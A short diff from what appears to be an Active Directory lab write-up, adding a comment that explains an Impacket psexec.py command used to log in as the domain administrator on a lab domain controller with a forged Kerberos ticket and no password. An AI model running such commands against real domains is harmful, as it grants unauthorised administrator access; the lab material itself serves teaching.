@@ -157,7 +157,7 @@ sudo ntpdate -u 192.168.57.9
 ```bash
 # psexec.py -k -no-pass <DOMAIN_NAME>/<USER_TO_IMPERSONATE>@<DC_HOSTNAME>.<DOMAIN_NAME>
 
-# 
+# Login as administrator user without password using the forged kerberose TGT
 psexec.py -k -no-pass dev-angelist.lab/administrator@corp-dc.dev-angelist.lab
 ```
 
